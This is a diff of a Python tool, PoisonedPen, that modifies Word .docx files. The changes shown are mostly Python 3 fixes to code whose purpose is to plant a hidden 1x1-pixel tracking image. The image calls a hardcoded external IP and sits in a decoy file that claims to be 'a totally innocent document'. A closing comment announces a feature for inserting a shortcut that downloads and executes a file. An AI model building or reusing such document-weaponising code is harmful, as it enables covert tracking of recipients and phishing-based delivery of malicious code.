@@ -24,7 +24,7 @@ class PoisonedPen:
 
   def get_dom( self, path='word/document.xml' ):
     x = self.get_xml(path) 
-    d = etree.ElementTree( etree.fromstring( x ) )
+    d = etree.ElementTree( etree.fromstring( x.encode('utf8') ) )
     return d
 
   # Get the raw XML markup in word/document.xml
@@ -32,13 +32,14 @@ class PoisonedPen:
     if path in list(self.contents.keys()):
       return self.contents[path]
     z = ZipFile( self.filename )
-    return z.read(path)
+    return z.read(path).decode('utf8')
 
   # Save doc
   def save( self ):
     if len(self.contents) == 0:
       print('No changes - save not required')
       return False
+    print('Writing out to '+self.filename)
     self.update_zip( self.contents )
 
   # Replace the contents of the zip with the dictionary of path:contents
@@ -70,18 +71,18 @@ class PoisonedPen:
     rid = 0
     for r in rels.findall('//'):
       i = int(r.attrib['Id'].replace('rId',''))
-      print(i)
+      # print(i)
       if i > rid:
         rid = i
     rid += 2
     rid = 'rId' + str( rid )
-    print('Creating element with rId ' + rid)
+    # print('Creating element with rId ' + rid)
     
     # Create rel
     attribs = {
       'Id': rid,
       'Type': rtype,
-      'Target': url,
+      'Target': target,
     }
     if targetmode:
       attribs['TargetMode'] = 'External'
@@ -89,8 +90,9 @@ class PoisonedPen:
     rels.getroot().append(rel)
     xmlstr = etree.tostring(rels,encoding='utf8',method='xml')
     # xmlstr = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="'+rid+'" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://193.36.15.194/tracker.gif?id=1" TargetMode="External"/></Relationships>'
-    print(xmlstr)
+    # print(xmlstr.decode('utf8'))
     self.contents['word/_rels/document.xml.rels'] = xmlstr
+    return rid
     
   
   # Insert a 1x1px image using the given URL at the end of the document
@@ -103,15 +105,15 @@ class PoisonedPen:
     settings = self.get_xml( 'word/settings.xml' )
     ok = False
     while not ok:
-      rsid = binascii.b2a_hex(os.urandom(4)).upper()
+      rsid = binascii.b2a_hex(os.urandom(4)).decode('utf8').upper()
       if rsid not in settings:
         ok = True
     rsid = '00CB6E19'
-    print('Random hex: ' + rsid)
+    # print('Random hex: ' + rsid)
     # rsid = '<w:rsid w:val="00ED3C60"/>'
     el = '<w:rsid w:val="'+rsid+'"/>'
     settings = settings.replace( '</w:rsids>', el + '</w:rsids>' )
-    contents['word/settings.xml'] = settings
+    self.contents['word/settings.xml'] = settings
     # contents['word/settings.xml'] = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:settings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" mc:Ignorable="w14 w15"><w:zoom w:percent="120"/><w:proofState w:spelling="clean" w:grammar="clean"/><w:defaultTabStop w:val="720"/><w:characterSpacingControl w:val="doNotCompress"/><w:compat><w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="15"/><w:compatSetting w:name="overrideTableStyleFontSizeAndJustification" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="enableOpenTypeFeatures" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="doNotFlipMirrorIndents" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="differentiateMultirowTableHeaders" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/></w:compat><w:rsids><w:rsidRoot w:val="000F7C79"/><w:rsid w:val="000F7C79"/><w:rsid w:val="00181E59"/><w:rsid w:val="00197E8A"/><w:rsid w:val="0023724B"/><w:rsid w:val="00292746"/><w:rsid w:val="00AA6863"/><w:rsid w:val="00C83833"/><w:rsid w:val="'+rsid+'"/><w:rsid w:val="00ED3C60"/><w:rsid w:val="00F83091"/><w:rsid w:val="00FC2467"/></w:rsids><m:mathPr><m:mathFont m:val="Cambria Math"/><m:brkBin m:val="before"/><m:brkBinSub m:val="--"/><m:smallFrac m:val="0"/><m:dispDef/><m:lMargin m:val="0"/><m:rMargin m:val="0"/><m:defJc m:val="centerGroup"/><m:wrapIndent m:val="1440"/><m:intLim m:val="subSup"/><m:naryLim m:val="undOvr"/></m:mathPr><w:themeFontLang w:val="en-GB"/><w:clrSchemeMapping w:bg1="light1" w:t1="dark1" w:bg2="light2" w:t2="dark2" w:accent1="accent1" w:accent2="accent2" w:accent3="accent3" w:accent4="accent4" w:accent5="accent5" w:accent6="accent6" w:hyperlink="hyperlink" w:followedHyperlink="followedHyperlink"/><w:shapeDefaults><o:shapedefaults v:ext="edit" spidmax="1026"/><o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout></w:shapeDefaults><w:decimalSymbol w:val="."/><w:listSeparator w:val=","/><w15:chartTrackingRefBased/><w15:docId w15:val="{C80FAF87-6FBB-4006-9231-945AFB0B53C8}"/></w:settings>'
 
     doc = self.get_xml( 'word/document.xml' )
@@ -120,10 +122,11 @@ class PoisonedPen:
     # Construct XML describing paragraph with an image in it, referencing the rId above
     p = '<w:p w:rsidR="'+rsid+'" w:rsidRDefault="'+rsid+'"><w:r><w:pict><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:5pt"><v:imagedata r:id="'+rid+'"/></v:shape></w:pict></w:r></w:p>'
     doc = doc.replace("</w:body>", p + "</w:body>" )
-    contents['word/document.xml'] = doc
+    self.contents['word/document.xml'] = doc
     # contents['word/document.xml'] = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 wp14"><w:body><w:p w:rsidR="00231807" w:rsidRDefault="000F7C79"><w:r><w:t>This is a totally innocent document</w:t></w:r></w:p><w:p w:rsidR="'+rsid+'" w:rsidRDefault="'+rsid+'"><w:r><w:pict><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:5pt"><v:imagedata r:id="'+rid+'"/></v:shape></w:pict></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="'+rsid+'"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="708" w:footer="708" w:gutter="0"/><w:cols w:space="708"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>'
 
-    self.contents.update( contents )
+    # self.contents.update( contents )
+    print('Inserted web bug, rsid: ' + rsid + ', rid: ' + rid + ', URL: ' + url )
     return True
 
   # Insert a lnk which does a download and exec of the specified file
